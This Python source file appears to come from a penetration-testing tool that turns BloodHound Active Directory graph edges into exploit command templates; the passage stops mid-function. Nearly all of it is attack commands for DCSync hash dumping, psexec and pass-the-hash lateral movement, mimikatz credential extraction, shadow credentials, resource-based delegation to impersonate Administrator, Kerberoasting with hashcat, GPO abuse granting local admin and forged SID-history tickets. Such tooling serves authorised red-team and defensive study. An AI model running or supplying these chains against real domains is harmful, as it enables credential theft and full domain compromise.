"""Exploit command suggestions for each BloodHound edge type.

get_commands() returns (CommandSet, next_actor) where next_actor is the
identity the attacker operates as AFTER exploiting this edge.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field


@dataclass
class CommandSet:
    description: str
    commands: list[str] = field(default_factory=list)
    preconditions: list[str] = field(default_factory=list)
    confidence: str = "medium"

    @property
    def has_commands(self) -> bool:
        return bool(self.commands)


def quote_posix(value: object) -> str:
    """Quote one untrusted value as a POSIX shell argument."""
    return shlex.quote(str(value))


def quote_powershell(value: object) -> str:
    """Quote one untrusted value as a PowerShell single-quoted string."""
    return "'" + str(value).replace("'", "''") + "'"


_SAFE_COMMAND_COMPONENT = re.compile(r"^[A-Za-z0-9_.@$:-]+$")


def safe_command_component(value: str, placeholder: str) -> str:
    """Keep legacy templates inert when an AD label contains shell syntax.

    New templates use explicit quoting. Older templates mix quoted and
    unquoted positions, so suspicious labels become an obvious placeholder
    instead of copy/paste command injection.
    """
    return value if _SAFE_COMMAND_COMPONENT.fullmatch(value) else placeholder


def _fqdn_to_dn(fqdn: str) -> str:
    return ",".join(f"DC={part}" for part in fqdn.split("."))


_DOMAIN_KIND_HINTS = ("domains",)


def _parse(label: str, kind: str = "") -> dict:
    """Extract short name, domain, and FQDN from a display name.

    `kind` (optional) — if "domains", the whole label is treated as the domain
    so that "HTB.LOCAL" yields domain="HTB.LOCAL" instead of "LOCAL".
    """
    label = (label or "").strip()
    if "@" in label:
        short, domain = label.rsplit("@", 1)
        return {"short": short, "domain": domain, "fqdn": label}
    if kind in _DOMAIN_KIND_HINTS and "." in label:
        return {"short": label.split(".")[0].upper(), "domain": label, "fqdn": label}
    if "." in label:
        parts = label.split(".")
        return {"short": parts[0].upper(), "domain": ".".join(parts[1:]), "fqdn": label}
    return {"short": label, "domain": "<DOMAIN>", "fqdn": label}


def _computer_identity(dst_name: str) -> str:
    """Return a computer account identity in COMPUTER$@DOMAIN form so that
    _parse() recovers the sAMAccountName (with the trailing '$') correctly.
    """
    p = _parse(dst_name)
    return f"{p['short']}$@{p['domain']}"


def _next_actor(
    rel_type: str,
    dst_name: str,
    dst_kind: str,
    current: str,
) -> str:
    """Return the identity the attacker operates as after this hop."""
    user_kinds = ("users", "")

    if rel_type in (
        "ForceChangePassword",
        "AddKeyCredentialLink",
        "DumpSMSAPassword",
        "ReadGMSAPassword",
        "SyncedToADUser",
        "SyncedToEntraUser",
        "WriteAltSecurityIdentities",
        "WritePublicInformation",
    ):
        return _computer_identity(dst_name) if dst_kind == "computers" else dst_name
    if rel_type in ("AllowedToDelegate", "AllowedToAct", "WriteAccountRestrictions"):
        dst = _parse(dst_name, dst_kind)
        return f"Administrator@{dst['domain']}"
    if rel_type in ("GenericWrite", "GenericAll"):
        return _computer_identity(dst_name) if dst_kind == "computers" else (
            dst_name if dst_kind in user_kinds else current
        )
    if rel_type == "AllExtendedRights":
        return dst_name if dst_kind in user_kinds else current
    if rel_type in ("ReadLAPSPassword", "SyncLAPSPassword"):
        # Local admin password → on-host SYSTEM → AD auth uses the machine account.
        if dst_kind == "computers":
            return _computer_identity(dst_name)
        return current
    if rel_type == "HasSession":
        # HasSession goes computer→user (BH CE schema). After this hop the
        # attacker has stolen the session and operates as the destination user.
        if dst_kind in user_kinds:
            return dst_name
        return current
    if rel_type in ("AdminTo", "SQLAdmin"):
        # AdminTo via psexec → SYSTEM; SQLAdmin → xp_cmdshell → SYSTEM.
        # SYSTEM on a domain-joined host = machine account for AD auth.
        if dst_kind == "computers":
            return _computer_identity(dst_name)
        return current
    if rel_type in ("CanPSRemote", "CanRDP", "ExecuteDCOM"):
        # Interactive session keeps the actor's user context. Onward AD steps
        # still run as the original actor unless the operator escalates to
        # SYSTEM locally (then the machine account would be used — out of scope
        # for the synthesized identity here).
        return current
    return current  # no identity change


def get_commands(
    rel_type: str,
    src_id: str,
    dst_id: str,
    src_name: str = "",
    dst_name: str = "",
    src_kind: str = "",
    dst_kind: str = "",
    actor: str = "",
    evidence: dict[str, str] | None = None,
) -> tuple[CommandSet, str]:
    """Return (CommandSet, next_actor) for a given edge.

    actor: display name of the identity currently in use.
           Defaults to src_name if empty.
    """
    act = _parse(actor or src_name, src_kind)
    src = _parse(src_name or src_id, src_kind)
    dst = _parse(dst_name or dst_id, dst_kind)

    A = safe_command_component(act["short"], "<SRC_ACCOUNT>")
    D = safe_command_component(act["domain"], "<DOMAIN>")
    SF = safe_command_component(src["fqdn"], "<SOURCE_OBJECT>")
    T = safe_command_component(dst["short"], "<TARGET_OBJECT>")
    TF = safe_command_component(dst["fqdn"], "<TARGET_FQDN>")
    evidence = evidence or {}
    CA_NAME = safe_command_component(evidence.get("ca_name", ""), "<CA_NAME>")
    TEMPLATE = safe_command_component(
        evidence.get("template_name", ""), "<VULNERABLE_TEMPLATE>"
    )
    AGENT_TEMPLATE = safe_command_component(
        evidence.get("agent_template_name", ""), "<ENROLLMENT_AGENT_TEMPLATE>"
    )

    PASS = "<SRC_PASSWORD>"
    HASH = "<NTLM_HASH>"
    DC   = "<DC_IP>"

    na = _next_actor(rel_type, dst_name or dst_id, dst_kind, actor or src_name)

    match rel_type:

        case (
            "MemberOf"
            | "Contains"
            | "ContainsIdentity"
            | "ClaimSpecialIdentity"
            | "GPOAppliesTo"
            | "HasSIDHistory"
            | "PropagatesACEsTo"
            | "SameForestTrust"
            | "SyncedToADUser"
            | "SyncedToEntraUser"
        ):
            return CommandSet("Structural relationship — no action required."), na

        case "ReadGMSAPassword":
            return CommandSet(
                f"Read the managed password for gMSA {TF} and derive its NT hash.",
                [
                    f"python3 gMSADumper.py -u '{A}' -p '{PASS}' -d '{D}' -l '<LDAP_SERVER>'",
                    f"nxc ldap {DC} -d '{D}' -u '{A}' -p '{PASS}' --gmsa",
                    f"impacket-getTGT '{D}/{T}' -hashes ':<GMSA_NT_HASH>' -dc-ip {DC}",
                ],
                ["Use the returned current managed-password hash for the exact gMSA target."],
                confidence="high",
            ), na

        case "DumpSMSAPassword":
            return CommandSet(
                f"Retrieve the standalone managed service account secret for {TF}.",
                [
                    "# From an authorized Windows host, use DSInternals or the LSA secret associated with the sMSA:",
                    f"Get-ADServiceAccount -Identity {quote_powershell(T)} -Properties msDS-HostServiceAccount",
                    "# Extract the corresponding _SC_<service> / managed-service-account secret only after host control is confirmed.",
                ],
                ["Administrative control of an authorized host may be required to access the cached sMSA secret."],
            ), na

        case "AdminTo":
            return CommandSet(
                f"Local admin on {TF} — code exec as SYSTEM, then dump local secrets.",
                [
                    "# Code exec (psexec gives SYSTEM, wmiexec/winrm give the calling user):",
                    f"impacket-psexec '{D}/{A}:{PASS}@{TF}'",
                    f"impacket-wmiexec '{D}/{A}:{PASS}@{TF}'",
                    f"evil-winrm -i {TF} -u '{A}' -p '{PASS}'",
                    "# Pass-the-hash:",
                    f"impacket-psexec '{D}/{A}@{TF}' -hashes ':{HASH}'",
                    "# Once SYSTEM — dump SAM, LSA secrets, cached creds, LSASS:",
                    f"impacket-secretsdump '{D}/{A}:{PASS}@{TF}'",
                    "# On-host:",
                    "# reg save HKLM\\SAM sam.sav  &&  reg save HKLM\\SECURITY sec.sav  &&  reg save HKLM\\SYSTEM sys.sav",
                    "# mimikatz: privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam ; lsadump::secrets",
                ],
            ), na

        case "CanRDP":
            return CommandSet(
                f"RDP access to {TF}.",
                [f"xfreerdp /v:{TF} /u:'{A}' /p:'{PASS}' /d:{D} /cert-ignore"],
            ), na

        case "CanPSRemote":
            return CommandSet(
                f"WinRM / PSRemote access to {TF}.",
                [
                    f"evil-winrm -i {TF} -u '{A}' -p '{PASS}'",
                    f"evil-winrm -i {TF} -u '{A}' -H '{HASH}'",
                ],
            ), na

        case "ExecuteDCOM":
            return CommandSet(
                f"DCOM lateral movement to {TF}.",
                [f"impacket-dcomexec -object MMC20 '{D}/{A}:{PASS}@{TF}' 'cmd.exe /c whoami'"],
            ), na

        case "SQLAdmin":
            return CommandSet(
                f"SQL Server admin on {TF}.",
                [
                    f"impacket-mssqlclient '{D}/{A}:{PASS}@{TF}' -windows-auth",
                    "# In mssqlclient: EXEC xp_cmdshell 'whoami'",
                ],
            ), na

        case "HasSession":
            return CommandSet(
                f"{SF} has an active session for {TF}. Connect to {SF} and steal the token/TGT.",
                [
                    f"impacket-psexec '{D}/{A}:{PASS}@{SF}'",
                    f"impacket-wmiexec '{D}/{A}:{PASS}@{SF}'",
                    "# Once on the host — dump sessions:",
                    "# mimikatz: sekurlsa::logonpasswords",
                    "# Rubeus:   Rubeus.exe dump /nowrap",
                ],
            ), na

        case "DCSync":
            return CommandSet(
                "DCSync — dump all domain hashes.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    "# Pass-the-hash:",
                    f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    "# On-host (Mimikatz):",
                    f"# lsadump::dcsync /domain:{D} /all /csv",
                ],
            ), na

        case "GetChanges" | "GetChangesAll":
            missing = "GetChangesAll" if rel_type == "GetChanges" else "GetChanges"
            return CommandSet(
                f"{rel_type} alone on {TF} — NOT exploitable for DCSync. "
                f"You also need {missing} on the same domain.",
                [
                    "# DCSync requires BOTH GetChanges AND GetChangesAll on the domain.",
                    f"# You currently have only {rel_type}; missing: {missing}.",
                    f"# Find a way to acquire {missing} (e.g., compromise another principal that holds it),",
                    "# or rely on a different escalation path.",
                ],
            ), na

        case "GetChangesInFilteredSet":
            return CommandSet(
                f"GetChangesInFilteredSet on {TF} — NOT a DCSync path. "
                f"This right only grants replication of the filtered attribute set "
                f"(RODC scenario) and does NOT substitute for GetChanges.",
                [
                    "# This right alone does not let you dump domain secrets.",
                    "# DCSync still requires GetChanges + GetChangesAll on the domain.",
                ],
            ), na

        case "GenericAll":
            if dst_kind in ("users", ""):
                return CommandSet(
                    f"Full control over user {TF} — reset password, shadow creds.",
                    [
                        "# Option 1 — force password reset:",
                        f"net rpc password '{T}' '<NEW_PASSWORD>' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' '<NEW_PASSWORD>'",
                        "# Option 2 — shadow credentials:",
                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    ],
                    [
                        "Confirm the target is not protected by AdminSDHolder inheritance.",
                        "Choose a new password that satisfies the domain policy.",
                    ],
                ), na
            elif dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Full control over domain {TF} — grant DCSync rights.",
                    [
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        "# Then dump all hashes:",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                        "# Pass-the-hash variant:",
                        f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    ],
                ), na
            elif dst_kind == "computers":
                return CommandSet(
                    f"Full control over computer {TF} — RBCD or shadow credentials.",
                    [
                        "# Option 1 — Resource-Based Constrained Delegation (needs MachineAccountQuota>0):",
                        f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass '<MACHINE_PASSWORD>' -dc-ip {DC}",
                        f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:<MACHINE_PASSWORD>' -dc-ip {DC}",
                        "export KRB5CCNAME=administrator.ccache",
                        f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                        "# Option 2 — shadow credentials (any case, no MAQ needed):",
                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}$' --action add --dc-ip {DC}",
                    ],
                    [
                        "RBCD requires a controlled principal with an SPN; creating one usually requires MachineAccountQuota > 0.",
                        "The impersonated account must be delegable and not a member of Protected Users.",
                    ],
                ), na
            elif dst_kind == "groups":
                return CommandSet(
                    f"Full control over group {TF} — add member.",
                    [
                        f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                    ],
                ), na
            elif dst_kind == "gpos":
                return CommandSet(
                    f"Full control over GPO {TF} — modify its policy files.",
                    [
                        f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command '<PAYLOAD>' -taskname '<TASK_NAME>'",
                    ],
                    [
                        "Resolve the GPO GUID and confirm where the GPO is linked.",
                        "Wait for policy refresh or trigger it on an authorized test target.",
                    ],
                ), na
            elif dst_kind in ("ous", "containers"):
                return CommandSet(
                    f"Full control over {dst_kind.rstrip('s')} {TF} — control descendants or its GPO link.",
                    [
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' gPLink -v '<GPLINK_VALUE>'",
                        f"dacledit.py -action write -rights FullControl -principal '{A}' -target-dn '<TARGET_DN>' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    ],
                    ["Identify an affected descendant and verify ACL inheritance before claiming compromise."],
                ), na
            elif dst_kind == "certtemplates":
                return CommandSet(
                    f"Full control over certificate template {TF} — create an ESC4-to-ESC1 configuration.",
                    [
                        f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}",
                        f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                    ],
                    ["Confirm the template is enabled and published by a reachable enterprise CA."],
                ), na
            elif dst_kind == "enterprisecas":
                return CommandSet(
                    f"Full control over enterprise CA object {TF}.",
                    [f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-templates -dc-ip {DC}"],
                    ["Validate the effective CA management rights on the CA host before attempting ESC7 operations."],
                ), na
            elif dst_kind in (
                "aiacas",
                "rootcas",
                "ntauthstores",
                "issuancepolicies",
            ):
                return CommandSet(
                    f"Full control over PKI object {TF}.",
                    [],
                    [
                        "This object type requires PKI-specific validation; Pathdog will not emit a generic group command.",
                        "Review the BloodHound edge details and the affected certificate chain or issuance policy.",
                    ],
                    confidence="low",
                ), na
            return CommandSet(
                f"Full control over unsupported object type {dst_kind or 'unknown'}: {TF}.",
                [],
                ["Validate the target object type and select an object-specific abuse primitive."],
                confidence="low",
            ), na

        case "AllExtendedRights":
            if dst_kind == "domains":
                return CommandSet(
                    f"All extended rights on domain {TF} — includes DCSync.",
                    [
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                        "# Pass-the-hash variant:",
                        f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    ],
                ), na
            if dst_kind in ("users", ""):
                return CommandSet(
                    f"All extended rights on user {TF} — force a password reset.",
                    [
                        f"net rpc password '{T}' '<NEW_PASSWORD>' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' '<NEW_PASSWORD>'",
                    ],
                    ["Choose a password that satisfies the domain password policy."],
                ), na
            if dst_kind == "computers":
                return CommandSet(
                    f"All extended rights on computer {TF}.",
                    [],
                    [
                        "Confirm which control-access rights are present (for example LAPS read or RBCD-related rights).",
                        "AllExtendedRights is not rendered as a user password reset for computer objects.",
                    ],
                    confidence="low",
                ), na
            if dst_kind in ("certtemplates", "enterprisecas"):
                return CommandSet(
                    f"All extended rights on PKI object {TF}.",
                    [f"certipy find -u '{A}@{D}' -p '{PASS}' -dc-ip {DC} -vulnerable -stdout"],
                    ["Confirm effective enrollment or CA management rights before exploitation."],
                ), na
            return CommandSet(
                f"All extended rights on {dst_kind or 'unknown'} object {TF}.",
                [],
                ["Resolve the specific extended rights before selecting an abuse command."],
                confidence="low",
            ), na

        case "AddMember" | "AddSelf":
            return CommandSet(
                f"Add a controlled user to group {TF}.",
                [
                    f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                    "# PowerView:",
                    f"Add-DomainGroupMember -Identity '{T}' -Members '{A}' -Credential $Cred",
                ],
            ), na

        case "ForceChangePassword":
            return CommandSet(
                f"Force-reset the password of {TF} — no current password needed.",
                [
                    f"net rpc password '{T}' '<NEW_PASSWORD>' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' '<NEW_PASSWORD>'",
                    "# PowerView:",
                    f"Set-DomainUserPassword -Identity '{T}' -AccountPassword (ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force) -Credential $Cred",
                ],
                ["Choose a password that satisfies the domain password policy."],
            ), na

        case "GenericWrite":
            T_sam = f"{T}$" if dst_kind == "computers" else T
            if dst_kind in ("users", "computers", ""):
                commands = [
                    "# Shadow credentials:",
                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
                ]
                prerequisites = ["PKINIT must be usable for the shadow-credentials workflow."]
                if dst_kind in ("users", ""):
                    commands.extend(
                        [
                            "# Alternative: targeted Kerberoasting:",
                            f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T_sam}' servicePrincipalName -v 'fake/pathdog'",
                            f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request-user '{T}' -outputfile spn_hash.txt",
                            "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                        ]
                    )
                    prerequisites.append("The targeted SPN workflow still requires cracking the returned ticket.")
                return CommandSet(
                    f"Generic write on {dst_kind or 'user'} {TF}.",
                    commands,
                    prerequisites,
                ), na
            if dst_kind == "groups":
                return CommandSet(
                    f"Generic write on group {TF} — modify membership.",
                    [f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'"],
                ), na
            if dst_kind == "gpos":
                return CommandSet(
                    f"Generic write on GPO {TF} — modify the policy payload.",
                    [f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command '<PAYLOAD>' -taskname '<TASK_NAME>'"],
                    ["Resolve the GPO GUID and identify linked, affected systems."],
                ), na
            if dst_kind in ("ous", "domains"):
                return CommandSet(
                    f"Generic write on {dst_kind.rstrip('s')} {TF} — modify gPLink.",
                    [f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' gPLink -v '<GPLINK_VALUE>'"],
                    ["Control a GPO and verify the link affects the intended descendants."],
                ), na
            if dst_kind == "certtemplates":
                return CommandSet(
                    f"Generic write on certificate template {TF} — ESC4 workflow.",
                    [f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}"],
                    ["Confirm the template is published and enrollment is available."],
                ), na
            if dst_kind == "issuancepolicies":
                return CommandSet(
                    f"Generic write on issuance policy {TF}.",
                    [],
                    ["Validate the OID group link and certificate mapping prerequisites before modifying the policy."],
                    confidence="low",
                ), na
            return CommandSet(
                f"Generic write on unsupported object type {dst_kind or 'unknown'}: {TF}.",
                [],
                ["Select an object-specific property and validate its downstream effect."],
                confidence="low",
            ), na

        case "WriteSPN":
            return CommandSet(
                f"Write SPN on {TF} then Kerberoast.",
                [
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request-user '{T}' -outputfile spn_hash.txt",
                    "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
                ["Crack the returned service ticket before treating the target as compromised."],
            ), na

        case "Owns" | "WriteOwner":
            if dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Take ownership of {TF}, then grant DCSync rights.",
                    [
                        f"owneredit.py -action write -new-owner '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        "# Then dump all hashes:",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    ],
                ), na
            return CommandSet(
                f"Take ownership of {TF}, then grant yourself FullControl.",
                [
                    f"owneredit.py -action write -new-owner '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                ],
            ), na

        case "WriteDacl":
            if dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Modify DACL on {TF} — grant DCSync rights.",
                    [
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        "# PowerView (TargetIdentity = domain DN):",
                        f"Add-DomainObjectAcl -TargetIdentity '{dn}' -PrincipalIdentity '{A}' -Rights DCSync -Credential $Cred",
                        "# Then dump all hashes:",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    ],
                ), na
            return CommandSet(
                f"Modify DACL on {TF} — grant yourself FullControl.",
                [
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    "# PowerView:",
                    f"Add-DomainObjectAcl -TargetIdentity '{T}' -PrincipalIdentity '{A}' -Rights All -Credential $Cred",
                ],
            ), na

        case "ReadLAPSPassword":
            return CommandSet(
                f"Read the LAPS local admin password for {TF}.",
                [
                    f"impacket-GetLAPSPassword '{D}/{A}:{PASS}@{DC}' -computer '{T}'",
                    f"pyLAPS --action get -c '{T}' -d {D} -u '{A}' -p '{PASS}' --dc-ip {DC}",
                    "# PowerShell:",
                    f"Get-ADComputer -Identity '{T}' -Properties 'ms-Mcs-AdmPwd' | Select -Expand 'ms-Mcs-AdmPwd'",
                ],
            ), na

        case "SyncLAPSPassword":
            target_sam = f"{T}$" if dst_kind == "computers" else T
            return CommandSet(
                f"Synchronize the LAPS password for {TF} through DirSync.",
                [
                    "# Import the DirSync PowerShell module, then authenticate as the source principal:",
                    f"Sync-LAPS -LDAPFilter \"(samaccountname={target_sam})\" -Server <DC_FQDN>",
                    "# SyncLAPSPassword is a DirSync primitive; it is distinct from direct ReadLAPSPassword access.",
                ],
            ), na

        case "AllowedToDelegate":
            return CommandSet(
                f"Constrained delegation — impersonate Administrator on {TF}.",
                [
                    "# Note: SPN must match an entry in msDS-AllowedToDelegateTo (often cifs/, host/, http/).",
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/{A}:{PASS}' -dc-ip {DC}",
                    "export KRB5CCNAME=administrator.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            ), na

        case "AddAllowedToAct" | "AllowedToAct" | "WriteAccountRestrictions":
            return CommandSet(
                f"Resource-Based Constrained Delegation (RBCD) on {TF}.",
                [
                    "# 1. Create a controlled computer account (needs MachineAccountQuota>0):",
                    f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass '<MACHINE_PASSWORD>' -dc-ip {DC}",
                    f"# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on {TF}:",
                    f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
                    "# 3. Get a service ticket as Administrator:",
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:<MACHINE_PASSWORD>' -dc-ip {DC}",
                    "export KRB5CCNAME=administrator.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
                [
                    "Control a principal with an SPN; creating a computer usually requires MachineAccountQuota > 0.",
                    "The impersonated account must not be marked sensitive or belong to Protected Users.",
                    "Confirm the requested SPN is accepted by the target service.",
                ],
            ), na

        case "AddKeyCredentialLink":
            T_sam = f"{T}$" if dst_kind == "computers" else T
            return CommandSet(
                f"Shadow credentials on {TF} — add key credential, obtain TGT.",
                [
                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
                    "# pywhisker outputs the gettgtpkinit command, e.g.:",
                    f"gettgtpkinit.py -cert-pfx '{T}.pfx' -pfx-pass '<PFX_PASS>' '{D}/{T_sam}' '{T}.ccache'",
                    f"export KRB5CCNAME='{T}.ccache'",
                    f"impacket-secretsdump -k -no-pass '{D}/{T_sam}@{DC}'",
                ],
            ), na

        case "GPLink":
            return CommandSet(
                f"GPO linked to {TF} — push malicious scheduled task.",
                [
                    f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'update'",
                    "# Or SharpGPOAbuse:",
                    f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {A} --GPOName '<GPO_NAME>'",
                ],
            ), na

        case "CanApplyGPO":
            apply_commands = [
                f"bloodyAD --host {DC} -d '{D}' -u '{A}' -p '{PASS}' set object '<TARGET_OU_DN>' gPLink -v '[LDAP://CN={{<GPO_GUID>}},CN=Policies,CN=System,{_fqdn_to_dn(D)};0]'",
                f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'PathdogUpdate'",
            ]
            if dst_kind == "computers":
                apply_commands.append(
                    f"nxc smb {quote_posix(TF)} -d '{D}' -u '{A}' -p '{PASS}' --exec-method wmiexec -x 'gpupdate /force'"
                )
            return CommandSet(
                f"Apply a controlled GPO to {TF} and deploy a scheduled task or local-admin change.",
                apply_commands,
                [
                    "Replace TARGET_OU_DN and GPO_GUID with the exact objects from the edge composition.",
                    "The GPO must be attacker-controlled and security/WMI filtering must include the target.",
                    "Do not force gpupdate unless remote execution on the target is already authorized and available.",
                ],
                confidence="medium",
            ), na

        case "WriteAltSecurityIdentities":
            return CommandSet(
                f"Write an explicit certificate mapping on user {TF}.",
                [
                    f"bloodyAD --host {DC} -d '{D}' -u '{A}' -p '{PASS}' set object '{T}' altSecurityIdentities -v '<X509_MAPPING>'",
                    f"certipy auth -pfx '<CONTROLLED_CERTIFICATE.pfx>' -username '{T}' -domain '{D}' -dc-ip {DC}",
                ],
                [
                    "Possess a certificate whose issuer/subject matches the mapping value.",
                    "Confirm certificate authentication and mapping policy are enabled in the domain.",
                ],
            ), na

        case "WritePublicInformation":
            return CommandSet(
                f"Write public-information attributes on user {TF}.",
                [
                    f"bloodyAD --host {DC} -d '{D}' -u '{A}' -p '{PASS}' set object '{T}' '<WRITABLE_ATTRIBUTE>' -v '<VALUE>'",
                    f"Get-ADUser -Identity {quote_powershell(T)} -Properties * | Format-List",
                ],
                [
                    "Identify the exact public-information attribute needed by the intended technique before writing it.",
                    "Back up the original value and restore it after validation.",
                ],
                confidence="medium",
            ), na

        case "HasTrustKeys":
            return CommandSet(
                f"Use trust keys held by {SF} to authenticate as trust account {TF}.",
                [
                    "# On an administratively controlled source-domain DC:",
                    "# mimikatz: lsadump::trust /patch",
                    f"impacket-getTGT '{D}/{T}' -hashes ':<RC4_TRUST_KEY>' -dc-ip {DC}",
                    f"export KRB5CCNAME={quote_posix(T + '.ccache')}",
                ],
                [
                    "Administrative access to a source-domain DC is required to dump the trust keys.",
                    "Trust accounts support Kerberos network logons, not NTLM or interactive logons.",
                ],
            ), na

        case "SpoofSIDHistory":
            return CommandSet(
                f"Forge or inject SID history to claim the identity represented by {TF}.",
                [
                    "# Forge a Kerberos ticket with the validated extra SID:",
                    f"impacket-ticketer -nthash '<KRBTGT_NTLM>' -domain-sid '<SOURCE_DOMAIN_SID>' -domain '{D}' -extra-sid '<TARGET_SID>' '{A}'",
                ],
                [
                    "Obtain the relevant Kerberos key and validate trust direction plus SID-filtering behavior.",
                    "Use the SID shown by BloodHound; do not assume Enterprise Admins or a fixed RID.",
                ],
            ), na

        case "AbuseTGTDelegation" | "CoerceToTGT":
            return CommandSet(
                f"Abuse trust/delegation semantics to obtain a usable TGT for {TF}.",
                [
                    "# Capture or request the delegated TGT using Rubeus/krbrelayx after validating the trust path.",
                    "# Rubeus.exe monitor /interval:1 /nowrap",
                    f"coercer coerce -u '{A}' -p '{PASS}' -d '{D}' -l '<CONTROLLED_HOST>' -t '{TF}'",
                ],
                [
                    "Confirm the exact trust direction, TGT delegation setting, SID filtering and controlled host prerequisites.",
                    "A trust edge alone is not proof that coercion or ticket capture will succeed.",
                ],
            ), na

        case "TrustedBy" | "CrossForestTrust":
            return CommandSet(
                f"Context-only domain trust involving {TF}; it is not an attack step by itself.",
                [],
                [
                    "Look for a derived SpoofSIDHistory, AbuseTGTDelegation or HasTrustKeys edge.",
                    "Validate direction, trust type, SID filtering and TGT delegation before attempting abuse.",
                ],
                confidence="low",
            ), na

        case "DCFor":
            return CommandSet(
                f"{SF} is a DC for {TF} — use it as the DC endpoint for DCSync.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{SF}'",
                ],
            ), na

        case "Enroll" | "AutoEnroll":
            return CommandSet(
